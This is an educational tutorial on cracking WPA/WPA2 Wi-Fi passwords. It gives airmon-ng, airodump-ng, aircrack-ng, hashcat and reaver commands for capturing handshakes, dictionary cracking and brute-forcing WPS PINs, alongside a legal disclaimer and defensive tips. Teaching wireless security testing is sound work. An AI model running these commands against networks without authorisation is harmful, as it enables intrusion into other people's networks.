# **Ethical Hacking: WPA/WPA2 Vulnerabilities (Basic to Advanced)**

## **Introduction**
WPA (Wi-Fi Protected Access) and WPA2 are modern encryption protocols designed to secure wireless networks. While WPA2 is much more secure than its predecessors, it still has vulnerabilities. Ethical hackers can explore these weaknesses in a controlled, legal environment to improve security.

## **Key Concepts**

1. **What is WPA/WPA2?**
   - WPA: Introduced in 2003 to replace WEP.
   - WPA2: The enhanced version, introduced in 2004, uses AES (Advanced Encryption Standard) for stronger security.
   
2. **WPA/WPA2 Vulnerabilities**
   - WPA/WPA2 is vulnerable to offline dictionary attacks (cracking weak passwords).
   - The **KRACK** (Key Reinstallation Attack) vulnerability in WPA2 was discovered in 2017.

3. **Legal and Ethical Disclaimer**
   - **Only test on networks you own or have explicit permission to access. Unauthorized testing is illegal and unethical.**

## **Tools Required**
1. **Operating System**
   - Kali Linux or another penetration testing distribution.

2. **Wireless Network Adapter**
   - Compatible with monitor mode and packet injection (e.g., Alfa AWUS036NHA).

3. **Software**
   - Aircrack-ng Suite
   - Hashcat (for cracking)
   - Wireshark (optional for packet analysis)
   - Reaver (for WPS attacks)

## **Basic WPA/WPA2 Cracking**

### **1. Set Up Your Environment**
   - Install Kali Linux.
   - Ensure your wireless adapter is capable of monitor mode and packet injection.

### **2. Enable Monitor Mode**
   - Start monitor mode with:
     ```bash
     airmon-ng start wlan0
     ```

### **3. Discover WPA/WPA2 Networks**
   - Use `airodump-ng` to identify nearby WPA/WPA2 networks:
     ```bash
     airodump-ng wlan0mon
     ```
   - Look for networks with WPA or WPA2 encryption.

### **4. Capture Handshake**
   - Capture the WPA handshake by targeting a specific network:
     ```bash
     airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
     ```
     - Replace `[channel]` and `[BSSID]` with the target network's details.
   - Wait for a client to connect to the network (or deauthenticate a connected client to force a handshake).

### **5. Crack WPA/WPA2 Password**
   - Use the captured handshake and a wordlist to crack the password:
     ```bash
     aircrack-ng -w /path/to/wordlist capture-01.cap
     ```
     - A successful attack will recover the password if it's in your wordlist.

## **Intermediate WPA2 Cracking (WPS Attacks)**

### **1. WPS Attack**
   - Some WPA2 routers have WPS (Wi-Fi Protected Setup), which is a vulnerability in the protocol.
   - WPS PIN is an 8-digit number, and it can be cracked in a few hours using `Reaver`:
     ```bash
     reaver -i wlan0mon -b [BSSID] -c [channel] -vv
     ```
   - If the WPS feature is enabled, this attack will eventually retrieve the WPA2 password.

## **Advanced WPA2 Cracking (Dictionary & GPU Cracking)**

### **1. Dictionary Attacks with Hashcat**
   - You can use **Hashcat** for more powerful cracking, especially when using GPU acceleration.
   - After capturing the WPA handshake:
     ```bash
     hashcat -m 2500 -a 0 capture-01.hccapx /path/to/wordlist
     ```
   - This will crack the handshake using a wordlist, leveraging GPU for faster processing.

### **2. Rainbow Tables**
   - If you have a known hash for WPA/WPA2, you can use **rainbow tables** (precomputed hashes for faster cracking).

## **Best Practices**

1. **Secure Your Own WPA2 Networks**
   - Avoid weak passwords; use long, random strings.
   - Disable WPS on your router.
   - Enable WPA3 encryption where possible for additional security.

2. **Learn Ethical Hacking**
   - Practice in controlled environments like:

     - [TryHackMe](https://tryhackme.com)
   - Participate in bug bounty programs to gain real-world experience.
